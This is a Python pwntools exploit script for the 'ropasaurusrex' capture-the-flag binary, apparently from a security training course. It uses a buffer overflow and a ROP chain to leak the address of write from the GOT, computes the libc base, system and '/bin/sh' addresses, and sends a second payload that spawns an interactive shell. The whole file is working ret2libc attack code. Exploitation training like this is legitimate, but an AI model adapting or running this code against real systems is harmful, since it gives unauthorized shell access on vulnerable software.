from pwn import *
import time


context.terminal = ['tmux', 'splitw', '-h']

r = process("./ropasaurusrex", env={"LD_PRELOAD":"./libc-2.27.so"})
#r = remote("training.jinblack.it", 2014)
gdb.attach(r, """b *0x08048442
""")

write_address = p32(0x0804830c) 
gadget_address = p32(0x080484b6)

param1 = 1 #fd --> write into the standard output
param2 = 0x08049614 #*buf --> write from
param3 = 4 #length --> i need 4 bytes because i want to print the address (4 bytes / 32 bit addr.)

read_addr = 0x080483f4

r.send(b"A" * 140 + write_address + gadget_address + p32(param1) + p32(param2) + p32(param3) + p32(read_addr))
time.sleep(0.2)

write_got = u32(r.recv(4))
print("0x%x" % write_got)
libc_base = write_got - 0xe6d80
print("0x%x" % libc_base)
libc_system_offset = 0x3d200
libc_system = libc_base + libc_system_offset
print("0x%x" % libc_system)
binsh_address = libc_base + 0x17e0cf
print("0x%x" % binsh_address)

gadget2 = 0x00

r.send(b"A"*140 + p32(libc_system) + b"BBBB" + p32(binsh_address))

r.interactive()
